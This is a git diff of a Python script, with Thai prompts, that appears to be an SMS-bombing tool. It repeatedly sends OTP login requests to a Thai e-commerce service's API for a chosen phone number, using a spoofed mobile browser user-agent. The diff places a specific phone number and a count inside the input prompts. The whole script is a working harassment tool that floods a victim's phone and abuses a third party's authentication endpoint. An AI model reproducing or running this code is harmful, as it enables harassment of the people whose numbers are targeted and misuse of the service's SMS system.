@@ -27,8 +27,8 @@ from requests import Session
 from requests import post,Session
 from threading import Thread
 import colorama
-phone = input("●ใส่เบอร์:")
-num = int(input("●จำนวนsms:"))
+phone = input("●ใส่เบอร์:0849049466")
+num = int(input("●จำนวนsms:1"))
 for i in range(num):
     requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone[1:]}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
     print("\033[92mAPI1ทำงาน")
